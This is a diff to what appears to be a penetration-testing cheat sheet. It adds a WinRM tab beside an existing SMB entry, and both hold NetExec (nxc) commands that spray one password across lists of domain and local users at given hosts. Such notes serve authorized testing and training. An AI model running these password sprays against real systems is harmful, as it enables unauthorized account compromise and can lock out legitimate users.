@@ -14,8 +14,12 @@ nxc smb -u users.txt -p 'Nexus123!' -d corp.com <DC_IP>
 ```
 {% endtab %}
 
-{% tab title="Second Tab" %}
-
+{% tab title="winrm" %}
+```bash
+# Spray one password for all identified domain-users in a machine.
+# This can work ALSO for local users so include them as well
+nxc winrm 10.10.206.148 -u all-users.txt -p 'Dolphin1'
+```
 {% endtab %}
 {% endtabs %}
 
